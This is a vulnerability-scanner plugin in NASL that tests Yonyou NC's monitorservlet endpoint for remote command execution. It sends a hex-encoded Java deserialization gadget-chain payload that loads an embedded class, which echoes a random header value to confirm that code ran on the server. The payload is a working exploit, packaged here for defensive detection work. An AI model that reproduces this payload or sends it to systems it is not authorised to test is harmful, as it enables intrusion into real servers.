include("compat.inc");
if (description)
{
  script_id(51799355);
  script_version("1.3");
  script_name(english:"Yonyou NC monitorservlet remote command execution vulnerability");
  script_summary(english:"Yonyou NC monitorservlet remote command execution vulnerability");
  script_set_attribute(attribute:"description", value:"Yonyou NC monitorservlet remote command execution vulnerability.");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl", "nc_65_detect.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/nc");
  script_require_keys("Services/nc/ssl");
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


ports = get_kb_list("Services/nc");
foreach port (ports){
	result_r = check_remote(port:port);
	if (result_r['vuln']){
		security_hole(port:port, extra:result_r['report']);
		exit(0);
	}
}

function check_remote(port){
	url = "/service/monitorservlet";
	data = hex2raw(s:"ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000013F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000077372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E000378707672002A6F72672E6D6F7A696C6C612E6A6176617363726970742E446566696E696E67436C6173734C6F61646572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C020000787000000001757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400166765744465636C61726564436F6E7374727563746F727571007E001A000000017671007E001A7371007E00137571007E0018000000017571007E00180000000074000B6E6577496E7374616E63657571007E001A000000017671007E00187371007E00137571007E001800000002740013636F6D2E746573742E796F6E796F752E646673757200025B42ACF317F8060854E00200007870000009FFCAFEBABE0000003300880A0014003E090023003F09002300400700410A0004003E09002300420A004300440A002300450A000400460A000400470A002300480700490A0014004A0A0012004B08004C0B000C004D08004E07004F0A001200500700510A005200530700540700550A005600570B001600580A0059005A0A0059005B0A0012005C0A005D005E0A005D005F0A001200600A002300610700620A00120063070064010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100046D61696E010016285B4C6A6176612F6C616E672F537472696E673B295601000169010015284C6A6176612F6C616E672F4F626A6563743B295A01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B4929560700550100014607004F07006507006607005101000A536F7572636546696C650100086466732E6A6176610C002C002D0C002800290C002A002B0100116A6176612F7574696C2F486173685365740C002400250700670C006800690C003700350C006A00330C006B00330C003200330100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C006C006D0C006E006F01000F4163636570742D4C616E67756567610C0070007101000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C007200730100106A6176612F6C616E672F4F626A6563740700740C007500760100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0700770C007800710C0079007A07007B0C007C007D0C007E002D0C007F00800700660C008100820C008300840C008500860C002A00350100135B4C6A6176612F6C616E672F4F626A6563743B0C0087006D010013636F6D2F746573742F796F6E796F752F64667301001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F537472696E67010006636F6E63617401000F6765744F757470757453747265616D01002528294C6A617661782F736572766C65742F536572766C65744F757470757453747265616D3B0100216A617661782F736572766C65742F536572766C65744F757470757453747265616D0100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373002100230014000000030008002400250001002600000002002700080028002900000008002A002B000000050001002C002D0001002E0000001D00010001000000052AB70001B100000001002F000000060001000000090009003000310001002E00000042000200010000001A01B3000201B30003BB000459B70005B30006B8000703B80008B100000001002F0000001600050000001000040011000800120012001300190014000A003200330001002E00000048000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000002002F00000012000400000017000E00180010001A0018001B00340000000400020E01000A002A00350001002E0000016100030004000000C91B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00B1B20002C7005113000C2AB6000DB6000E9900442AC0000CB30002B20002120FB900100200C7000A01B30002A70043B20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700214DA7001DB20003C700171300162AB6000DB6000E99000A2AC00016B30003B20002C60036B20003C60030B20002120FB9001002004D2C2CB600184EB20003B9001901002DB6001AB20003B900190100B6001BA700044DB12A1B0460B80008B1000200480067006A0017009400BC00BF00170002002F0000005E00170000001F0012002000130022001A0023002D00240034002500410026004800290067002B006A002A006B002B006E002D0081002E0088003000940032009F003400A5003500B1003600BC003800BF003700C0003900C1003B00C8003D003400000012000A12003461070036031976070036000006000A003700350001002E000001100002000C000000842AB6000D4D2CB6001C4E2DBE360403360515051504A200652D1505323A06190604B6001D013A0719062AB6001E3A071907B6000DB6001F9A000C19071BB80020A7002F1907C00021C000213A081908BE360903360A150A1509A200161908150A323A0B190B1BB80020840A01A7FFE9A700053A08840501A7FF9A2CB60022594DC7FF85B100010027006F007200170002002F0000003E000F0000003F00050041001E00420024004300270045002F0047003A00480043004A0063004B0069004A006F00510072005000740041007A00540083005600340000002E0008FC0005070038FE000B0700390101FD003107003A07003BFE00110700210101F8001942070036F90001F800050001003C00000002003D74000B646566696E65436C6173737571007E001A00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E00287371007E00137571007E0018000000027400046D61696E7571007E001A00000001767200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078707400096765744D6574686F647571007E001A0000000271007E002D71007E001E7371007E00137571007E001800000002707571007E00180000000170740006696E766F6B657571007E001A00000002767200106A6176612E6C616E672E4F626A6563740000000000000000000000787071007E00247371007E000F7371007E0000770C000000003F4000000000000078737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000001077080000001000000000787878");
	
	randstr = rand_str(length:8);
	
	if (get_kb_item("Services/nc/ssl")){
		var req =
				'POST ' + url +' HTTP/1.1\r\n' +
				'Host: ' + get_host_ip()+':'+ port+ '\r\n' +
				'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
				'Accept-Encoding: gzip, deflate' + '\r\n' +
				'Accept-Languega: ' + randstr +'\r\n' +
				'Content-Type: application/x-www-form-urlencoded' + '\r\n' +
				'Connection: keep-alive'+ '\r\n' +
				'Accept: */*' + '\r\n' + 
				'\r\n'+data;
				
		ssl_reqs = https_req_get(request:req, port:port);
		if ("200 OK" >< ssl_reqs && randstr >< ssl_reqs){
			report = ssl_reqs;
			return {'vuln':true, 'report':report};
		}
	}
	else{
		res_send = http_send_recv3(method: "POST",port: port, data:data, item: url,add_headers: make_array("Content-Type","application/x-www-form-urlencoded","Accept-Languega",randstr));
		if(randstr >< res_send[2] && "200 OK" >< res_send[0]){
			report = res_send[2];
			return {'vuln':true, 'report':report};
		}

	}
}